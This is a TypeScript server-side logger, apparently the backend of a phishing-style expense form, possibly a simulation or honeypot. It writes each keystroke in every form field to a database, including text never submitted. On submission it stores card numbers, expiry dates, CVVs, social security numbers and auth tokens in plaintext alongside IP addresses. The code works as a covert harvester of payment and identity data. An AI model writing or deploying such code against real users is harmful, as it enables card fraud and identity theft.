import { neon } from '@neondatabase/serverless';

// Edge runtime compatible logger with keystroke-first workflow
export async function logger(entry: Record<string, unknown>) {
  try {
    // Console logging for immediate debugging
    console.log('SECURITY_LOG:', JSON.stringify(entry));
    
    // Database logging
    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Insert into general security_logs table
      await sql(
        'INSERT INTO security_logs (type, timestamp, ip_address, user_agent, referer, data) VALUES ($1, $2, $3, $4, $5, $6)',
        [
          entry.type as string,
          entry.timestamp as string,
          entry.ip as string,
          entry.userAgent as string,
          entry.referer as string,
          JSON.stringify(entry)
        ]
      );

      // Handle keystroke logging - immediate capture
      if (entry.type === 'keystroke') {
        const sessionId = entry.sessionId as string;
        
        // Ensure form session exists
        await sql(
          `INSERT INTO form_sessions (session_id_browser, first_keystroke_at, last_keystroke_at, ip_address, user_agent)
           VALUES ($1, NOW(), NOW(), $2, $3)
           ON CONFLICT (session_id_browser) 
           DO UPDATE SET last_keystroke_at = NOW()`,
          [sessionId, entry.ip as string, entry.userAgent as string]
        );

        // Log the keystroke
        await sql(
          'INSERT INTO keystroke_logs (field_name, field_value, session_id_browser, ip_address, user_agent, referer, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)',
          [
            entry.field as string,
            entry.value as string,
            sessionId,
            entry.ip as string,
            entry.userAgent as string,
            entry.referer as string,
            entry.timestamp as string
          ]
        );
      }

      // Handle form submission - update existing records
      if (entry.type === 'submit' && entry.formData) {
        const formData = entry.formData as any;
        const sessionId = entry.sessionId as string;
        
        // Insert the submission record
        await sql(
          `INSERT INTO form_submissions 
           (employee_name, employee_id, expense_description, amount, business_purpose, 
            client_name, notes, card_number, card_expiry, card_cvv, ssn, 
            session_id, auth_token, session_id_browser, was_submitted, ip_address, user_agent, timestamp) 
           VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18)`,
          [
            formData.employeeName,
            formData.employeeId,
            formData.expenseDescription,
            formData.amount,
            formData.businessPurpose,
            formData.clientName,
            formData.notes,
            formData.cardNumber,
            formData.cardExpiry,
            formData.cardCvv,
            formData.ssn,
            entry.sessionId as string,
            entry.authToken as string,
            sessionId,
            true, // was_submitted = true
            entry.ip as string,
            entry.userAgent as string,
            entry.timestamp as string
          ]
        );

        // Update form session to mark as submitted
        await sql(
          `UPDATE form_sessions 
           SET was_submitted = TRUE, submitted_at = NOW() 
           WHERE session_id_browser = $1`,
          [sessionId]
        );

        // Update all keystroke logs for this session to mark as submitted
        await sql(
          `UPDATE keystroke_logs 
           SET was_submitted = TRUE 
           WHERE session_id_browser = $1`,
          [sessionId]
        );
      }
    }
    
  } catch (error) {
    console.error("Logger error:", error);
    // Fallback to console only if database fails
    console.log('FALLBACK_LOG:', JSON.stringify(entry));
  }
}